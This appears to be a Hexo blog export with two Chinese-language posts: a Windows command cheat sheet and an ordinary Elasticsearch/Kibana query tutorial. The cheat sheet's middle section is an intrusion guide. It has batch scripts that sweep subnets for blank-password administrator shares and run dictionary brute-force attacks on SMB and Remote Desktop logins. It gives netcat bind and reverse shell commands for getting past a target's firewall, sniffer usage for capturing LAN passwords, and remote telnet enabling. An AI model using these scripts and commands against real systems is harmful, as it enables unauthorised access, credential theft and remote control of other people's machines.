mkdir 目录名 建立目录</span><br><span class="line">　　rmdir 删除子目录，目录内没有文档。</span><br><span class="line">　　chmod 设定档案或目录的存取权限</span><br><span class="line">　　grep 在档案中查找字符串</span><br><span class="line">　　diff 档案文件比较</span><br><span class="line">　　find 档案搜寻</span><br><span class="line">　　date 现在的日期、时间</span><br><span class="line">　　who 查询目前和你使用同一台机器的人以及Login时间地点</span><br><span class="line">　　w 查询目前上机者的详细资料</span><br><span class="line">　　whoami 查看自己的帐号名称</span><br><span class="line">　　groups 查看某人的Group</span><br><span class="line">　　passwd 更改密码</span><br><span class="line">　　history 查看自己下过的命令</span><br><span class="line">　　ps 显示进程状态</span><br><span class="line">　　kill 停止某进程</span><br><span class="line">　　gcc 黑客通常用它来编译C语言写的文件</span><br><span class="line">　　su 权限转换为指定使用者</span><br><span class="line">　　telnet IP telnet连接对方主机（同win2K），当出现bash$时就说明连接成功。</span><br><span class="line">　　ftp ftp连接上某服务器（同win2K）</span><br><span class="line">　　批处理命令与变量</span><br><span class="line">　　1：for命令及变量 基本格式</span><br><span class="line">　　FOR &#x2F;参数 %variable IN (set) DO command [command_parameters] %variable:指定一个单一字母可替换的参数，如：%i ，而指定一个变量则用：%%i ，而调用变量时用：%i% ，变量是区分大小写的（%i 不等于 %I）。</span><br><span class="line">　　批处理每次能处理的变量从%0—%9共10个，其中%0默认给批处理文件名使用，%1默认为使用此批处理时输入的的第一个值，同理：%2—%9指输入的第2-9个值；例：net use ipipc$ pass &#x2F;user:user 中ip为%1,pass为%2 ,user为%3</span><br><span class="line">　　(set):指定一个或一组文件，可使用通配符，如：(D:user.txt)和(1 1 254)(1 -1 254),&#123; “(1 1 254)”第一个&quot;1&quot;指起始值，第二个&quot;1&quot;指增长量，第三个&quot;254&quot;指结束值，即：从1到254；“(1 -1 254)”说明：即从254到1 &#125;</span><br><span class="line">　　command：指定对第个文件执行的命令，如：net use命令；如要执行多个命令时，命令这间加：&amp; 来隔开</span><br><span class="line">　　command_parameters：为特定命令指定参数或命令行开关</span><br><span class="line">　　IN (set)：指在(set)中取值；DO command ：指执行command</span><br><span class="line">　　参数：&#x2F;L 指用增量形式&#123; (set)为增量形式时 &#125;；&#x2F;F 指从文件中不断取值，直到取完为止&#123; (set)为文件时，如(d:pass.txt)时 &#125;。</span><br><span class="line">　　用法举例：</span><br><span class="line">　　@echo off</span><br><span class="line">　　echo 用法格式：test.bat *.*.* &gt; test.txt</span><br><span class="line">　　for &#x2F;L %%G in (1 1 254) do echo %1.%%G &gt;&gt;test.txt &amp; net use \%1.%%G &#x2F;user:administrator | find &quot;命令成功完成&quot; &gt;&gt;test.txt</span><br><span class="line">　　存为test.bat 说明：对指定的一个C类网段的254个IP依次试建立administrator密码为空的IPC$连接，如果成功就把该IP存在test.txt中。</span><br><span class="line">　　&#x2F;L指用增量形式（即从1-254或254-1）；输入的IP前面三位：*.*.*为批处理默认的 %1；%%G 为变量(ip的最后一位）；&amp; 用来隔开echo 和net use 这二个命令；| 指建立了ipc$后，在结果中用find查看是否有&quot;命令成功完成&quot;信息；%1.%%G 为完整的IP地址；(1 1 254) 指起始值，增长量，结止值。</span><br><span class="line">　　@echo off</span><br><span class="line">　　echo 用法格式：ok.bat ip</span><br><span class="line">　　FOR &#x2F;F %%i IN (D:user.dic) DO smb.exe %1 %%i D:pass.dic 200</span><br><span class="line">　　存为：ok.exe 说明：输入一个IP后，用字典文件d:pass.dic来暴解d:user.dic中的用户密码，直到文件中值取完为止。%%i为用户名；%1为输入的IP地址（默认）。</span><br><span class="line">　　七：</span><br><span class="line">　　2：if命令及变量 基本格式</span><br><span class="line">　　IF [not] errorlevel 数字 命令语句 如果程序运行最后返回一个等于或大于指定数字的退出编码，指定条件为“真”。</span><br><span class="line">　　例：IF errorlevel 0 命令 指程序执行后返回的值为0时，就值行后面的命令；IF not errorlevel 1 命令指程序执行最后返回的值不等于1，就执行后面的命令。</span><br><span class="line">　　0 指发现并成功执行（真）；1 指没有发现、没执行（假）。</span><br><span class="line">　　IF [not] 字符串1&#x3D;&#x3D;字符串2 命令语句 如果指定的文本字符串匹配（即：字符串1 等于 字符串2），就执行后面的命令。</span><br><span class="line">　　例：“if &quot;%2%&quot;&#x3D;&#x3D;&quot;4&quot; goto start”指：如果输入的第二个变量为4时，执行后面的命令（注意：调用变量时就%变量名%并加&quot; &quot;）</span><br><span class="line">　　IF [not] exist 文件名 命令语句 如果指定的文件名存在，就执行后面的命令。</span><br><span class="line">　　例：“if not nc.exe goto end”指：如果没有发现nc.exe文件就跳到&quot;:end&quot;标签处。</span><br><span class="line">　　IF [not] errorlevel 数字 命令语句 else 命令语句或 IF [not] 字符串1&#x3D;&#x3D;字符串2 命令语句 else 命令语句或 IF [not] exist 文件名 命令语句 else 命令语句 加上：else 命令语句后指：当前面的条件不成立时，就指行else后面的命令。注意：else 必须与 if 在同一行才有效。 当有del命令时需把del命令全部内容用&lt; &gt;括起来，因为del命令要单独一行时才能执行，用上&lt; &gt;后就等于是单独一行了；例如：“if exist test.txt. &lt;del test.txt.&gt; else echo test.txt.missing ”，注意命令中的“.”</span><br><span class="line">　　系统外部命令</span><br><span class="line">　　注：系统外部命令(均需下载相关工具)</span><br><span class="line">　　瑞士军刀：nc.exe</span><br><span class="line">　　参数说明：</span><br><span class="line">　　-h 查看帮助信息</span><br><span class="line">　　-d 后台模式</span><br><span class="line">　　-e prog程序重定向，一但连接就执行[危险]</span><br><span class="line">　　-i secs延时的间隔</span><br><span class="line">　　-l 监听模式，用于入站连接</span><br><span class="line">　　-L 监听模式，连接天闭后仍然继续监听，直到CTR+C</span><br><span class="line">　　-n IP地址，不能用域名</span><br><span class="line">　　-o film记录16进制的传输</span><br><span class="line">　　-p[空格]端口 本地端口号</span><br><span class="line">　　-r 随机本地及远程端口</span><br><span class="line">　　-t 使用Telnet交互方式</span><br><span class="line">　　-u UDP模式</span><br><span class="line">　　-v 详细输出，用-vv将更详细</span><br><span class="line">　　-w数字 timeout延时间隔</span><br><span class="line">　　-z 将输入，输出关掉（用于扫锚时）</span><br><span class="line">　　基本用法：</span><br><span class="line">　　nc -nvv 192.168.0.1 80 连接到192.168.0.1主机的80端口</span><br><span class="line">　　nc -l -p 80 开启本机的TCP 80端口并监听</span><br><span class="line">　　nc -nvv -w2 -z 192.168.0.1 80-1024 扫锚192.168.0.1的80-1024端口</span><br><span class="line">　　nc -l -p 5354 -t -e c:winntsystem32cmd.exe 绑定remote主机的cmdshell在remote的TCP 5354端口</span><br><span class="line">　　nc -t -e c:winntsystem32cmd.exe 192.168.0.2 5354 梆定remote主机的cmdshell并反向连接192.168.0.2的5354端口</span><br><span class="line">　　高级用法：</span><br><span class="line">　　nc -L -p 80 作为蜜罐用1：开启并不停地监听80端口，直到CTR+C为止</span><br><span class="line">　　nc -L -p 80 &gt; c:log.txt 作为蜜罐用2：开启并不停地监听80端口，直到CTR+C,同时把结果输出到c:log.txt</span><br><span class="line">　　nc -L -p 80 &lt; c:honeyport.txt 作为蜜罐用3-1：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中，亦可起到传送文件作用</span><br><span class="line">　　type.exe c:honeyport | nc -L -p 80 作为蜜罐用3-2：开启并不停地监听80端口，直到CTR+C,并把c:honeyport.txt中内容送入管道中,亦可起到传送文件作用</span><br><span class="line">　　本机上用：nc -l -p 本机端口</span><br><span class="line">　　在对方主机上用：nc -e cmd.exe 本机IP -p 本机端口 *win2K</span><br><span class="line">　　nc -e &#x2F;bin&#x2F;sh 本机IP -p 本机端口 *linux,unix 反向连接突破对方主机的防火墙</span><br><span class="line">　　本机上用：nc -d -l -p 本机端口 &lt; 要传送的文件路径及名称</span><br><span class="line">　　在对方主机上用：nc -vv 本机IP 本机端口 &gt; 存放文件的路径及名称 传送文件到对方主机</span><br><span class="line">　　备 注：</span><br><span class="line">　　| 管道命令</span><br><span class="line">　　&lt; 或 &gt; 重定向命令。“&lt;”，例如：tlntadmn &lt; test.txt 指把test.txt的内容赋值给tlntadmn命令</span><br><span class="line">　　@ 表示执行@后面的命令，但不会显示出来（后台执行）；例：@dir c:winnt &gt;&gt; d:log.txt 意思是：后台执行dir，并把结果存在d:log.txt中</span><br><span class="line">　　&gt;与&gt;&gt;的区别 &quot;&gt;&quot;指：覆盖；&quot;&gt;&gt;&quot;指：保存到(添加到）。</span><br><span class="line">　　如：@dir c:winnt &gt;&gt; d:log.txt和@dir c:winnt &gt; d:log.txt二个命令分别执行二次比较看：用&gt;&gt;的则是把二次的结果都保存了，而用：&gt;则只有一次的结果，是因为第二次的结果把第一次的覆盖了。</span><br><span class="line">　　八：</span><br><span class="line">　　扫描工具：xscan.exe</span><br><span class="line">　　基本格式</span><br><span class="line">　　xscan -host &lt;起始IP&gt;[-&lt;终止IP&gt;] &lt;检测项目&gt; [其他选项] 扫锚&quot;起始IP到终止IP&quot;段的所有主机信息</span><br><span class="line">　　xscan -file &lt;主机列表文件名&gt; &lt;检测项目&gt; [其他选项] 扫锚&quot;主机IP列表文件名&quot;中的所有主机信息</span><br><span class="line">　　检测项目</span><br><span class="line">　　-active 检测主机是否存活</span><br><span class="line">　　-os 检测远程操作系统类型（通过NETBIOS和SNMP协议）</span><br><span class="line">　　-port 检测常用服务的端口状态</span><br><span class="line">　　-ftp 检测FTP弱口令</span><br><span class="line">　　-pub 检测FTP服务匿名用户写权限</span><br><span class="line">　　-pop3 检测POP3-Server弱口令</span><br><span class="line">　　-smtp 检测SMTP-Server漏洞</span><br><span class="line">　　-sql 检测SQL-Server弱口令</span><br><span class="line">　　-smb 检测NT-Server弱口令</span><br><span class="line">　　-iis 检测IIS编码&#x2F;解码漏洞</span><br><span class="line">　　-cgi 检测CGI漏洞</span><br><span class="line">　　-nasl 加载Nessus攻击脚本</span><br><span class="line">　　-all 检测以上所有项目</span><br><span class="line">　　其它选项</span><br><span class="line">　　-i 适配器编号 设置网络适配器, &lt;适配器编号&gt;可通过&quot;-l&quot;参数获取</span><br><span class="line">　　-l 显示所有网络适配器</span><br><span class="line">　　-v 显示详细扫描进度</span><br><span class="line">　　-p 跳过没有响应的主机</span><br><span class="line">　　-o 跳过没有检测到开放端口的主机</span><br><span class="line">　　-t 并发线程数量,并发主机数量 指定最大并发线程数量和并发主机数量, 默认数量为100,10</span><br><span class="line">　　-log 文件名 指定扫描报告文件名 (后缀为：TXT或HTML格式的文件)</span><br><span class="line">　　用法示例</span><br><span class="line">　　xscan -host 192.168.1.1-192.168.255.255 -all -active -p　检测192.168.1.1-192.168.255.255网段内主机的所有漏洞，跳过无响应的主机</span><br><span class="line">　　xscan -host 192.168.1.1-192.168.255.255 -port -smb -t 150 -o 检测192.168.1.1-192.168.255.255网段内主机的标准端口状态，NT弱口令用户，最大并发线程数量为150，跳过没有检测到开放端口的主机</span><br><span class="line">　　xscan -file hostlist.txt -port -cgi -t 200,5 -v -o 检测“hostlist.txt”文件中列出的所有主机的标准端口状态，CGI漏洞，最大并发线程数量为200，同一时刻最多检测5台主机，显示详细检测进度，跳过没有检测到开放端口的主机</span><br><span class="line">　　九：</span><br><span class="line">　　命令行方式嗅探器: xsniff.exe</span><br><span class="line">　　可捕获局域网内FTP&#x2F;SMTP&#x2F;POP3&#x2F;HTTP协议密码</span><br><span class="line">　　参数说明</span><br><span class="line">　　-tcp 输出TCP数据报</span><br><span class="line">　　-udp 输出UDP数据报</span><br><span class="line">　　-icmp 输出ICMP数据报</span><br><span class="line">　　-pass 过滤密码信息</span><br><span class="line">　　-hide 后台运行</span><br><span class="line">　　-host 解析主机名</span><br><span class="line">　　-addr IP地址 过滤IP地址</span><br><span class="line">　　-port 端口 过滤端口</span><br><span class="line">　　-log 文件名 将输出保存到文件</span><br><span class="line">　　-asc 以ASCII形式输出</span><br><span class="line">　　-hex 以16进制形式输出</span><br><span class="line">　　用法示例</span><br><span class="line">　　xsniff.exe -pass -hide -log pass.log 后台运行嗅探密码并将密码信息保存在pass.log文件中</span><br><span class="line">　　xsniff.exe -tcp -udp -asc -addr 192.168.1.1 嗅探192.168.1.1并过滤tcp和udp信息并以ASCII格式输出</span><br><span class="line">　　终端服务密码破解: tscrack.exe</span><br><span class="line">　　参数说明</span><br><span class="line">　　-h 显示使用帮助</span><br><span class="line">　　-v 显示版本信息</span><br><span class="line">　　-s 在屏幕上打出解密能力</span><br><span class="line">　　-b 密码错误时发出的声音</span><br><span class="line">　　-t 同是发出多个连接（多线程）</span><br><span class="line">　　-N Prevent System Log entries on targeted server</span><br><span class="line">　　-U 卸载移除tscrack组件</span><br><span class="line">　　-f 使用－f后面的密码</span><br><span class="line">　　-F 间隔时间（频率）</span><br><span class="line">　　-l 使用－l后面的用户名</span><br><span class="line">　　-w 使用－w后面的密码字典</span><br><span class="line">　　-p 使用－p后面的密码</span><br><span class="line">　　-D 登录主页面</span><br><span class="line">　　用法示例</span><br><span class="line">　　tscrack 192.168.0.1 -l administrator -w pass.dic 远程用密码字典文件暴破主机的administrator的登陆密码</span><br><span class="line">　　tscrack 192.168.0.1 -l administrator -p 123456 用密码123456远程登陆192.168.0.1的administrator用户</span><br><span class="line">　　@if not exist ipcscan.txt goto noscan</span><br><span class="line">　　@for &#x2F;f &quot;tokens&#x3D;1 delims&#x3D; &quot; %%i in (3389.txt) do call hack.bat %%i</span><br><span class="line">　　nscan</span><br><span class="line">　　@echo 3389.txt no find or scan faild</span><br><span class="line">　　(①存为3389.bat) （假设现有用SuperScan或其它扫锚器扫到一批开有3389的主机IP列表文件3389.txt)</span><br><span class="line">　　3389.bat意思是：从3389.txt文件中取一个IP，接着运行hack.bat</span><br><span class="line">　　@if not exist tscrack.exe goto noscan</span><br><span class="line">　　@tscrack %1 -l administrator -w pass.dic &gt;&gt;rouji.txt</span><br><span class="line">　　:noscan</span><br><span class="line">　　@echo tscrack.exe no find or scan faild</span><br><span class="line">　　(②存为hack.bat) (运行3389.bat就OK，且3389.bat、hack.bat、3389.txt、pass.dic与tscrack.exe在同一个目录下；就可以等待结果了)</span><br><span class="line">　　hack.bat意思是：运行tscrack.exe用字典暴破3389.txt中所有主机的administrator密码，并将破解结果保存在rouji.txt文件中。</span><br><span class="line">　　其它</span><br><span class="line">　　Shutdown.exe</span><br><span class="line">　　Shutdown IP地址 t:20 20秒后将对方NT自动关闭（Windows 2003系统自带工具，在Windows2000下用进就得下载此工具才能用。在前面Windows 2003 DOS命令中有详细介绍。）</span><br><span class="line">　　fpipe.exe (TCP端口重定向工具) 在第二篇中有详细说明（端口重定向绕过防火墙）</span><br><span class="line">　　fpipe -l 80 -s 1029 -r 80 当有人扫锚你的80端口时，他扫到的结果会完全是的主机信息</span><br><span class="line">　　Fpipe -l 23 -s 88 -r 23 目标IP 把本机向目标IP发送的23端口Telnet请求经端口重定向后，就通过88端口发送到目标IP的23端口。（与目标IP建立Telnet时本机就用的88端口与其相连接）然后：直接Telnet 127.0.0.1（本机IP）就连接到目标IP的23端口了。</span><br><span class="line">　　OpenTelnet.exe (远程开启telnet工具)</span><br><span class="line">　　opentelnet.exe IP 帐号　密码　ntlm认证方式　Telnet端口 （不需要上传ntlm.exe破坏微软的身份验证方式）直接远程开启对方的telnet服务后，就可用telnet ip 连接上对方。</span><br><span class="line">　　NTLM认证方式：0：不使用NTLM身份验证；1：先尝试NTLM身份验证，如果失败，再使用用户名和密码；2：只使用NTLM身份验证。</span><br><span class="line">　　ResumeTelnet.exe (OpenTelnet附带的另一个工具)</span><br><span class="line">　　resumetelnet.exe IP　帐号　密码 用Telnet连接完对方后，就用这个命令将对方的Telnet设置还原，并同时关闭Telnet服务。</span><br><span class="line">　　FTP命令详解</span><br><span class="line">　　FTP命令是Internet用户使用最频繁的命令之一，熟悉并灵活应用FTP的内部命令，可以大大方便使用者，并收到事半功倍之效。如果你想学习使用进行后台FTP下载，那么就必须学习FTP指令。</span><br><span class="line">　　FTP的命令行格式为：</span><br><span class="line">　　ftp -v -d -i -n -g [主机名] ，其中</span><br><span class="line">　　-v 显示远程服务器的所有响应信息</span><br><span class="line">　　-n 限制ftp的自动登录，即不使用；.n etrc文件；</span><br><span class="line">　　-d 使用调试方式；</span><br><span class="line">　　-g 取消全局文件名。</span><br><span class="line">　　FTP使用的内部命令如下(中括号表示可选项):</span><br><span class="line">　　1.![cmd[args]]：在本地机中执行交互shell，exit回到ftp环境，如：!ls*.zip</span><br><span class="line">　　2.$ macro-ame[args]： 执行宏定义macro-name。</span><br><span class="line">　　3.account[password]： 提供登录远程系统成功后访问系统资源所需的补充口令。</span><br><span class="line">　　4.append local-file[remote-file]：将本地文件追加到远程系统主机，若未指定远程系统文件名，则使用本地文件名。</span><br><span class="line">　　5.ascii：使用ascii类型传输方式。</span><br><span class="line">　　6.bell：每个命令执行完毕后计算机响铃一次。</span><br><span class="line">　　7.bin：使用二进制文件传输方式。</span><br><span class="line">　　8.bye：退出ftp会话过程。</span><br><span class="line">　　9.case：在使用mget时，将远程主机文件名中的大写转为小写字母。</span><br><span class="line">　　10. cd remote-dir：进入远程主机目录。</span><br><span class="line">　　11.cdup：进入远程主机目录的父目录。</span><br><span class="line">　　12.chmod mode file-name：将远程主机文件file-name的存取方式设置为mode，如：chmod 777 a.out。</span><br><span class="line">　　13.close：中断与远程服务器的ftp会话(与open对应)。</span><br><span class="line">　　14 .cr：使用asscii方式传输文件时，将回车换行转换为回行。</span><br><span class="line">　　15.delete remote-file：删除远程主机文件。</span><br><span class="line">　　16.debug[debug-value]：设置调试方式， 显示发送至远程主机的每条命令，如：deb up 3，若设为0，表示取消debug。</span><br><span class="line">　　17.dir[remote-dir][local-file]：显示远程主机目录，并将结果存入本地文件。</span><br><span class="line">　　18.disconnection：同close。</span><br><span class="line">　　19.form format：将文件传输方式设置为format，缺省为file方式。</span><br><span class="line">　　20.get remote-file[local-file]： 将远程主机的文件remote-file传至本地硬盘的local-file。</span><br><span class="line">　　21.glob：设置mdelete，mget，mput的文件名扩展，缺省时不扩展文件名，同命令行的-g参数。</span><br><span class="line">　　22.hash：每传输1024字节，显示一个hash符号(#)。</span><br><span class="line">　　23.help[cmd]：显示ftp内部命令cmd的帮助信息，如：help get。</span><br><span class="line">　　24.idle[seconds]：将远程服务器的休眠计时器设为[seconds]秒。</span><br><span class="line">　　25.image：设置二进制传输方式(同binary)。</span><br><span class="line">　　26.lcd[dir]：将本地工作目录切换至dir。</span><br><span class="line">　　27. ls[remote-dir][local-file]：显示远程目录remote-dir， 并存入本地文件local-file。</span><br><span class="line">　　28.macdef macro-name：定义一个宏，遇到macdef下的空行时，宏定义结束。</span><br><span class="line">　　29.mdelete[remote-file]：删除远程主机文件。</span><br><span class="line">　　30.mdir remote-files local-file：与dir类似，但可指定多个远程文件，如 ：mdir *.o.*.zipoutfile 。</span><br><span class="line">　　31.mget remote-files：传输多个远程文件。</span><br><span class="line">　　32.mkdir dir-name：在远程主机中建一目录。</span><br><span class="line">　　33.mls remote-file local-file：同nlist，但可指定多个文件名。</span><br><span class="line">　　34.mode[modename]：将文件传输方式设置为modename， 缺省为stream方式。</span><br><span class="line">　　35.modtime file-name：显示远程主机文件的最后修改时间。</span><br><span class="line">　　36.mput local-file：将多个文件传输至远程主机。</span><br><span class="line">　　37.newer file-name： 如果远程机中file-name的修改时间比本地硬盘同名文件的时间更近，则重传该文件。</span><br><span class="line">　　38.nlist[remote-dir][local-file]：显示远程主机目录的文件清单，并存入本地硬盘的local-file。</span><br><span class="line">　　39.nmap[inpattern outpattern]：设置文件名映射机制， 使得文件传输时，文件中的某些字符相互转换， 如：nmap $1.$2.$3[$1，$2].[$2，$3]，则传输文件a1.a2.a3时，文件名变为a1，a2。 该命令特别适用于远程主机为非UNIX机的情况。</span><br><span class="line">　　40.ntrans[inchars[outchars]]：设置文件名字符的翻译机制，如ntrans1R，则文件名LLL将变为RRR。</span><br><span class="line">　　41.open host[port]：建立指定ftp服务器连接，可指定连接端口。</span><br><span class="line">　　42.passive：进入被动传输方式。</span><br><span class="line">　　43.prompt：设置多个文件传输时的交互提示。</span><br><span class="line">　　44.proxy ftp-cmd：在次要控制连接中，执行一条ftp命令， 该命令允许连接两个ftp服务器，以在两个服务器间传输文件。第一条ftp命令必须为open，以首先建立两个服务器间的连接。</span><br><span class="line">　　45.put local-file[remote-file]：将本地文件local-file传送至远程主机。</span><br><span class="line">　　46.pwd：显示远程主机的当前工作目录。</span><br><span class="line">　　47.quit：同bye，退出ftp会话。</span><br><span class="line">　　48.quote arg1，arg2...：将参数逐字发至远程ftp服务器，如：quote syst.</span><br><span class="line">　　49.recv remote-file[local-file]：同get。</span><br><span class="line">　　50.reget remote-file[local-file]：类似于get， 但若local-file存在，则从上次传输中断处续传。</span><br><span class="line">　　51.rhelp[cmd-name]：请求获得远程主机的帮助。</span><br><span class="line">　　52.rstatus[file-name]：若未指定文件名，则显示远程主机的状态， 否则显示文件状态。</span><br><span class="line">　　53.rename[from][to]：更改远程主机文件名。</span><br><span class="line">　　54.reset：清除回答队列。</span><br><span class="line">　　55.restart marker：从指定的标志marker处，重新开始get或put，如：restart 130。</span><br><span class="line">　　56.rmdir dir-name：删除远程主机目录。</span><br><span class="line">　　57.runique：设置文件名只一性存储，若文件存在，则在原文件后加后缀.1， .2等。</span><br><span class="line">　　58.send local-file[remote-file]：同put。</span><br><span class="line">　　59.sendport：设置PORT命令的使用。</span><br><span class="line">　　60.site arg1，arg2...：将参数作为SITE命令逐字发送至远程ftp主机。</span><br><span class="line">　　61.size file-name：显示远程主机文件大小，如：site idle 7200。</span><br><span class="line">　　62.status：显示当前ftp状态。</span><br><span class="line">　　63.struct[struct-name]：将文件传输结构设置为struct-name， 缺省时使用stream结构。</span><br><span class="line">　　64.sunique：将远程主机文件名存储设置为只一(与runique对应)。</span><br><span class="line">　　65.system：显示远程主机的操作系统类型。</span><br><span class="line">　　66.tenex：将文件传输类型设置为TENEX机的所需的类型。</span><br><span class="line">　　67.tick：设置传输时的字节计数器。</span><br><span class="line">　　68.trace：设置包跟踪。</span><br><span class="line">　　69.type[type-name]：设置文件传输类型为type-name，缺省为ascii，如:type binary，设置二进制传输方式。</span><br><span class="line">　　70.umask[newmask]：将远程服务器的缺省umask设置为newmask，如：umask 3</span><br><span class="line">　　71.user user-name[password][account]：向远程主机表明自己的身份，需要口令时，必须输入口令，如：user anonymous my@email。</span><br><span class="line">　　72.verbose：同命令行的-v参数，即设置详尽报告方式，ftp 服务器的所有响 应都将显示给用户，缺省为on.</span><br><span class="line">　　73.?[cmd]：同help.</span><br></pre></td></tr></table></figure><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> common </category>
          
      </categories>
      
      
        <tags>
            
            <tag> windows </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>elasticsearch</title>
      <link href="/2020/07/30/elasticsearch/"/>
      <url>/2020/07/30/elasticsearch/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><blockquote><p>elasticsearch</p></blockquote><a id="more"></a><h1 id="环境配置"><a class="markdownIt-Anchor" href="#环境配置"></a> 环境配置</h1><h2 id="elasticsearch"><a class="markdownIt-Anchor" href="#elasticsearch"></a> elasticsearch</h2><h3 id="依赖"><a class="markdownIt-Anchor" href="#依赖"></a> 依赖</h3><ul><li><p>是java开发的，需要java环境，1.8.0以上。</p></li><li><p>nodejs</p></li><li><p>安装完成后启动，elasticsearch默认在localhost:9200建立服务。</p></li></ul><h2 id="kibana"><a class="markdownIt-Anchor" href="#kibana"></a> kibana</h2><ul><li><p>用于数据的统计、操作</p></li><li><p>安装完成后启动，kibana默认在localhost:5601建立服务。</p></li></ul><h2 id="ik"><a class="markdownIt-Anchor" href="#ik"></a> ik</h2><ul><li><a href="https://github.com/medcl/elasticsearch--analysis-il/release">下载地址</a></li><li>中文分词，放在elasticsearch中plugins里。</li></ul><h1 id="kibana操作指令"><a class="markdownIt-Anchor" href="#kibana操作指令"></a> kibana操作指令</h1><h2 id="增删改查"><a class="markdownIt-Anchor" href="#增删改查"></a> 增删改查</h2><h3 id="get"><a class="markdownIt-Anchor" href="#get"></a> GET</h3><ul><li>GET获取数据</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#获取所有数据</span><br><span class="line">GET &#x2F;*</span><br><span class="line"># 中文分词</span><br><span class="line">GET &#x2F;_analyze</span><br><span class="line">&#123;</span><br><span class="line">    &quot;analyzer&quot;:&quot;ik_max_word&quot;,</span><br><span class="line">    &quot;text&quot;:&quot;我是&quot;</span><br><span class="line">&#125;</span><br><span class="line">#查看索引</span><br><span class="line">GET _cat&#x2F;indices?v</span><br><span class="line">#查询-restful风格</span><br><span class="line">GET test1&#x2F;type1&#x2F;_search?q&#x3D;age:12</span><br><span class="line">#查询-构建方式</span><br><span class="line">GET test1&#x2F;type1&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;:&#123;</span><br><span class="line">        &quot;match&quot;:&#123;</span><br><span class="line">            &quot;age&quot;:12</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="put"><a class="markdownIt-Anchor" href="#put"></a> PUT</h3><ul><li>没有插入数据，否则更新，字段全部变为当前数据</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 索引&#x2F;类型&#x2F;uuid</span><br><span class="line">PUT test1&#x2F;type1&#x2F;1</span><br><span class="line">&#123;</span><br><span class="line">    &quot;name&quot;:&quot;key&quot;,</span><br><span class="line">    &quot;age&quot;:12</span><br><span class="line">&#125;</span><br><span class="line"># 查询</span><br><span class="line">GET test1&#x2F;type1&#x2F;1</span><br></pre></td></tr></table></figure><h3 id="post"><a class="markdownIt-Anchor" href="#post"></a> POST</h3><ul><li>通过<code>_update</code>，只修改指定字段</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST test1&#x2F;type1&#x2F;1&#x2F;_update</span><br><span class="line">&#123;</span><br><span class="line">    &quot;age&quot;:13</span><br><span class="line">&#125;</span><br><span class="line"># 查询</span><br><span class="line">GET test1&#x2F;type1&#x2F;1</span><br></pre></td></tr></table></figure><h3 id="delete"><a class="markdownIt-Anchor" href="#delete"></a> DELETE</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DELETE &#x2F;test1&#x2F;type1&#x2F;1</span><br><span class="line">DELETE &#x2F;test1</span><br></pre></td></tr></table></figure><h2 id="构造查询"><a class="markdownIt-Anchor" href="#构造查询"></a> 构造查询</h2><ul><li>构造查询可以实现复杂查询需求</li></ul><h3 id="全部查询"><a class="markdownIt-Anchor" href="#全部查询"></a> 全部查询</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET goods&#x2F;fruit&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;:&#123;</span><br><span class="line">        &quot;match_all&quot;:&#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="排序查询"><a class="markdownIt-Anchor" href="#排序查询"></a> 排序查询</h3><ul><li>只能选择可排序的属性：日期，数字</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET goods&#x2F;fruit&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;:&#123;</span><br><span class="line">        &quot;match&quot;:&#123;</span><br><span class="line">            &quot;name&quot;:&quot;pingguo&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;sort&quot;:[</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;price&quot;:&quot;desc&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分页查询"><a class="markdownIt-Anchor" href="#分页查询"></a> 分页查询</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET goods&#x2F;fruit&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;:&#123;</span><br><span class="line">        &quot;match&quot;:&#123;</span><br><span class="line">            &quot;name&quot;:&quot;pingguo&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;sort&quot;:[</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;price&quot;:&quot;desc&quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ],</span><br><span class="line">    &quot;from&quot;:1,</span><br><span class="line">    &quot;size&quot;:2</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="指定内容查询"><a class="markdownIt-Anchor" href="#指定内容查询"></a> 指定内容查询</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">GET goods&#x2F;fruit&#x2F;_search</span><br><span class="line">&#123;</span><br><span class="line">    &quot;query&quot;:&#123;</span><br><span class="line">        &quot;match_all&quot;:&#123;&#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;_source&quot;:&quot;name&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>指定多个</li></ul><figure class="highlight plain"><table><tr><td class="code"><pre><span 